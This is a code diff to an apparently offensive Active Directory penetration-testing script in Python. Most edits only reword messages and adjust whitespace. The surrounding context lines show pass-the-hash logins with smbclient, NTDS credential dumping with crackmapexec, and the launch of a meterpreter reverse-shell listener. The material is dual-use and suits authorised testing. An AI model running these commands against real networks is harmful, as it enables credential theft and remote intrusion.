@@ -105,38 +105,37 @@ else:
 
 def testOne():
    if TIP[:5] == "EMPTY":
-      print("[-] REMOTE IP has not been specified...")
+      print("[-] The remote IP has not been specified...")
       return 1
    return 0
    
 def testTwo():
    if TIP[:5] == "EMPTY":
-      print("[-] REMOTE IP has not been specified...")
+      print("[-] The remote IP has not been specified...")
       return 1
    if DOM[:5] == "EMPTY":
-      print("[-] DOMAIN NAME has not been specified...")
+      print("[-] A domain name has not been specified...")
       return 1
    return 0  
    
 def testThree():
    if USR[:2] == "''":
-      print("[-] USERNAME has not been specified...")
+      print("[-] A username has not been specified...")
       return 1
    if SID[:5] == "EMPTY":
-      print("[-] Domain SID has not been specified...")
+      print("[-] The domain SID has not been specified...")
       return 1
    return 0
    
 def testFour(variable):
    if variable not in PTS:
-      print("[-] Port " + variable + " not found in live ports...")
+      print("[-] Port " + variable + " not found in live ports listing...")
       return 1
    else:
       return 0
 
 def spacePadding(variable,value):
    variable = variable.rstrip("\n")
-   variable = variable[:value]
    while len(variable) < value:
       variable += " "
    variable = variable[:value]
@@ -144,10 +143,9 @@ def spacePadding(variable,value):
 
 def dotPadding(variable,value):
    variable = variable.rstrip("\n")
-   variable = variable[:value] 
    while len(variable) < value:
       variable += "."
-   variable = variable[:value]
+   variable = variable[:value] 
    return variable
 
 def getTime():
@@ -160,11 +158,11 @@ def getTime():
    return variable   
    
 def getPort():
-   num = input("[*] Please enter the listening port number: ")
+   num = input("[*] Please enter a listening port number: ")
    if num.isdigit():
       return num
    else:
-      print("[-] Sorry, I did not understand the value " + num + "...")
+      print("[-] I'm sorry, I do not understand the value " + num + "...")
       return 1
 
 def command(variable):
@@ -174,7 +172,7 @@ def command(variable):
    return
  
 def prompt():
-   null = input("\nPress ENTER to continue...")
+   userInput = input("\nPress ENTER to continue...")
    return
    
 def wipeTokens(VALD):
@@ -651,21 +649,21 @@ if not os.path.exists(dataDir + "/tokens.txt"):
 else:
    print("[+] File tokens.txt already exists...")
    
-SKEW = 0                                  # TIME-SKEW SWITCH
-DOMC = 0                                  # DOMAIN SWITCH
-DNSC = 0                                  # DNS SWITCH
-HTTP = 0				  # HTTP SERVER PORT
+SKEW = 0                                # TIME-SKEW SWITCH
+DOMC = 0                                # DOMAIN SWITCH
+DNSC = 0                                # DNS SWITCH
+HTTP = 0				# HTTP SERVER PORT
 
-COL1 = 40                                 # MAX LEN SESSION DATA
-COL2 = 44                                 # MAX LEN SHARE NAME
-COL3 = 23                                 # MAX LEN USER NAME
-COL4 = 32                                 # MAX LEN NTLM HASH
-COL5 = 1                                  # MAX LEN TOKEN VALUE
+COL1 = 40                               # MAX LEN SESSION DATA
+COL2 = 44                               # MAX LEN SHARE NAME
+COL3 = 23                               # MAX LEN USER NAME
+COL4 = 32                               # MAX LEN NTLM HASH
+COL5 = 1                                # MAX LEN TOKEN VALUE
 
-SHAR = [" "*COL2]*maxUser						# SHARE NAMES
-USER = [" "*COL3]*maxUser						# USER NAMES
-HASH = [" "*COL4]*maxUser						# NTLM HASH
-VALD = ["0"*COL5]*maxUser						# USER TOKENS
+SHAR = [" "*COL2]*maxUser		# SHARE NAMES
+USER = [" "*COL3]*maxUser		# USER NAMES
+HASH = [" "*COL4]*maxUser		# NTLM HASH
+VALD = ["0"*COL5]*maxUser		# USER TOKENS
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -677,17 +675,17 @@ VALD = ["0"*COL5]*maxUser						# USER TOKENS
 
 if not os.path.exists(dataDir + "/config.txt"):
    print("[-] Configuration file not found - using defualt values...")
-   DNS = "EMPTY              "						                        # DNS IP
-   TIP = "EMPTY              " 						                        # REMOTE IP
-   POR = "EMPTY              " 						                        # LIVE PORTS
-   WEB = "EMPTY              " 						                        # WEB ADDRESS
-   USR = "''                 " 						                        # SESSION USERNAME
-   PAS = "''                 "						                        # SESSION PASSWORD       
-   NTM = "EMPTY              " 						                        # SESSION HASH
-   TGT = "EMPTY              "						                        # SESSION TICKET-NAME
-   DOM = "EMPTY              " 						                        # SESSION DOMAIN-NAME
-   SID = "EMPTY              " 						                        # SESSION DOMAIN-SID
-   TSH = "EMPTY              " 						                        # SESSIOM SHARE
+   DNS = "EMPTY              "							# DNS IP
+   TIP = "EMPTY              " 						        # REMOTE IP
+   POR = "EMPTY              " 						        # LIVE PORTS
+   WEB = "EMPTY              " 						        # WEB ADDRESS
+   USR = "''                 " 						        # SESSION USERNAME
+   PAS = "''                 "						        # SESSION PASSWORD       
+   NTM = "EMPTY              " 						        # SESSION HASH
+   TGT = "EMPTY              "						        # SESSION TICKET-NAME
+   DOM = "EMPTY              " 						        # SESSION DOMAIN-NAME
+   SID = "EMPTY              " 						        # SESSION DOMAIN-SID
+   TSH = "EMPTY              " 						        # SESSIOM SHARE
 else:
    print("[+] Configuration file found - restoring saved data....")
    DNS = linecache.getline(dataDir + "/config.txt", 1).rstrip("\n")
@@ -1976,7 +1974,7 @@ while True:
             print("[i] Using HASH value as password credential...")
             command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash -s " + TSH.rstrip(" " ))
          else:
-            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " -s " + TSH.rstrip(" "))
+            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -s " + TSH.rstrip(" "))
       prompt()
    
 # ------------------------------------------------------------------------------------- 
@@ -2556,7 +2554,7 @@ while True:
                command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi")                    
 
       try:
-         null = input("\nPress ENTER to continue...")
+         prompt()
       except EOFError as e:
          print(e)
                
@@ -3318,7 +3316,7 @@ while True:
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          command("xdotool key Ctrl+Tab")
          
-         print("[+] Reverse shell started, use 'win_https_reverse_shell.exe' to connect..")
+         print("[+] Reverse shell started, use exploit 'win_https_reverse_shell.exe' to connect..")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
